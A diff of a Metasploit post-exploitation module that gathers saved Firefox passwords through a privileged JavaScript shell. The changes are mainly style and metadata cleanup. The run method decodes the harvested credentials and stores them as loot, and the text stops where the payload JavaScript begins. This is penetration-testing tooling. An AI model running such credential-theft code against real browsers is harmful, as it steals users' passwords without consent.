@@ -1,31 +1,36 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'json'
-require 'msf/core'
-require 'msf/core/payload/firefox'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Payload::Firefox
   include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Firefox Gather Passwords from Privileged Javascript Shell',
-      'Description'   => %q{
-        This module allows collection of passwords from a Firefox Privileged Javascript Shell.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'joev' ],
-      'DisclosureDate' => 'Apr 11 2014'
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Firefox Gather Passwords from Privileged JavaScript Shell',
+        'Description' => %q{
+          This module allows collection of passwords from a Firefox Privileged JavaScript Shell.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'joev' ],
+        'DisclosureDate' => '2014-04-11',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options([
-      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
-    ], self.class)
+      OptInt.new('TIMEOUT', [true, 'Maximum time (seconds) to wait for a response', 90])
+    ])
   end
 
   def run
@@ -34,23 +39,23 @@ class MetasploitModule < Msf::Post
       begin
         passwords = JSON.parse(results)
         passwords.each do |entry|
-          entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
+          entry.each_key { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
         end
 
-        if passwords.length > 0
-          file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
+        if !passwords.empty?
+          file = store_loot('firefox.passwords.json', 'text/json', rhost, passwords.to_json)
           print_good("Saved #{passwords.length} passwords to #{file}")
         else
-          print_warning("No passwords were found in Firefox.")
+          print_warning('No passwords were found in Firefox.')
         end
-      rescue JSON::ParserError => e
+      rescue JSON::ParserError
         print_warning(results)
       end
     end
   end
 
   def js_payload
-    %Q|
+    %|
       (function(send){
         try {
           var manager = Components
